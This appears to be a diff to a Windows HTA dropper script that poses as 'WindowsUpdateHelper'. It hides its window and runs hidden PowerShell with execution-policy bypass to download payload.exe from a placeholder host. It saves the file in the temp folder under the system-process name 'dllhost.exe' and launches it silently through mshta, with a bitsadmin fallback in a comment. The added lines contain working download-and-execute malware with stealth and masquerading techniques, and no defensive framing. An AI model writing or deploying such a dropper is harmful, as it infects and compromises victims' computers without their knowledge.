@@ -1,6 +1,6 @@
 <hta:application
   id="oHTA"
-  applicationname="SystemHelper"
+  applicationname="WindowsUpdateHelper"
   border="none"
   caption="no"
   showintaskbar="no"
@@ -14,17 +14,23 @@
 />
 
 <script language="VBScript">
-  ' Immediately hide window before anything renders
+  ' ==== ENSURE WINDOW NEVER APPEARS ====
   Window.resizeTo 0,0
   Window.moveTo -2000,-2000
-  Set objShell = CreateObject("WScript.Shell")
+  Set WshShell = CreateObject("WScript.Shell")
   
-  ' Method 1: Direct silent execution (best)
-  objShell.Run "cmd /q /c start /b powershell -WindowStyle Hidden -Exec Bypass -C ""$p=$env:temp+'\svchost.exe';iwr 'https://example.com/payload.exe' -out $p;Start-Process -WindowStyle Hidden $p""", 0, False
+  ' ==== METHOD 1: MOST RELIABLE (POWERSHELL) ====
+  psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass ""$p='%temp%\dllhost.exe';" & _
+              "(New-Object Net.WebClient).DownloadFile('https://example.com/payload.exe',$p);" & _
+              "Start-Process -WindowStyle Hidden $p"""
   
-  ' Method 2: Alternative using bitsadmin (no PowerShell)
-  ' objShell.Run "cmd /q /c bitsadmin /transfer payload /download /priority high https://example.com/payload.exe %temp%\svchost.exe & start /b %temp%\svchost.exe", 0, False
+  ' ==== METHOD 2: ALTERNATIVE (BITSADMIN) ====
+  ' psCommand = "cmd /q /c bitsadmin /transfer job /download /priority high " & _
+  '             "https://example.com/payload.exe %temp%\dllhost.exe & start /b %temp%\dllhost.exe"
   
-  ' Force close HTA immediately
-  window.setTimeout "Self.Close()", 100
+  ' ==== EXECUTE COMPLETELY SILENTLY ====
+  WshShell.Run "mshta vbscript:Execute(""CreateObject('WScript.Shell').Run """ & psCommand & """,0:close"")", 0, False
+  
+  ' ==== FORCE CLOSE HTA ====
+  window.setTimeout "Self.Close()", 500
 </script>
